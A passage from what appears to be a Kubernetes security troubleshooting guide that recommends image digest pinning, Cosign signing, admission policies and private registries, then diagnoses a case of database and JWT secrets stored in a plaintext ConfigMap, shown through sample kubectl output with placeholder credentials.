1. Pin images by SHA256 digest image: anihpj/jobpost-api@sha256:abc123def456... Digests are immutable — the image content CANNOT change. Even if the tag is overwritten, the digest still points to the original image.
2. Sign all images with Cosign in CI pipeline cosign sign --key cosign.key anihpj/jobpost-api@sha256:abc123... Sign every image after build. The signature proves the image was built by YOUR CI pipeline — not an attacker with registry access.
3. Deploy admission controller to verify signatures Kyverno policy: verify Cosign signatures on all images at admission time. Reject pods with unsigned images or images signed with unknown keys.
4. Deploy a private registry (Harbor/ECR/GCR) Use a private registry with IAM-based access control. Only the CI pipeline has push access. Developers can only pull. Docker Hub credentials are never shared.
5. Pin base images by digest too FROM python:3.9@sha256:def789... Even base images should be pinned. This ensures reproducible builds and prevents base image mutation attacks.
💡 Personal Advice:
Tags are mutable. Digests are immutable. Use digests in production. A :v1.2 tag is a pointer — it can point to different images at different times. An @sha256:... digest is the actual image hash — it can NEVER change. Pin to digests for every production deployment. Tags are for humans. Digests are for machines.
Image signing closes the supply chain loop. Even with a private registry, how do you know the image wasn't tampered with? Cosign signatures provide cryptographic proof that the image came from your CI pipeline. Verify at admission time — no unsigned image ever runs in your cluster.
MV10
🔗 CATEGORY 4: MICROSERVICE VULNERABILITIES — Issue MV10
Secret Hardcoded in Application ConfigMap — Not Using Kubernetes Secrets

🔍 Symptom: kubectl get cm anihpj-config -n anihpj -o yaml shows database passwords, API keys, and JWT signing secrets in PLAINTEXT in a ConfigMap. kubectl describe cm anihpj-config prints the password on screen. ConfigMaps are NOT designed for sensitive data — they are readable by anyone with get configmaps RBAC, appear in plaintext in etcd, and are printed in logs and terminal output. Secrets should be stored in Kubernetes Secret resources with etcd encryption at rest.

  kubectl get cm anihpj-config -n anihpj -o yaml
  data:
    DATABASE_URL: postgresql://anihpj_admin:SuperSecretP@ss123!@anihpj-db:5432/jobpost
    JWT_SECRET: my-super-secret-jwt-key-do-not-share   ← PLAINTEXT IN CONFIGMAP!

  kubectl describe cm anihpj-config -n anihpj
  Data
  ====
  DATABASE_URL: postgresql://anihpj_admin:SuperSecretP@ss123!@anihpj-db:5432/jobpost
🔴5 Most Likely Causes
  1. Sensitive data in ConfigMap instead of Secret: ConfigMaps are for non-sensitive configuration. Secrets are for sensitive data. The team put passwords and keys in a ConfigMap — they're visible to anyone with namespace read access and appear in plaintext in etcd.
  2. ConfigMap mounted as environment variables from envFrom: envFrom: [{configMapRef: {name: anihpj-config}}] injects ALL ConfigMap keys as environment variables. The password is now visible in /proc/<pid>/environ and debug endpoints.
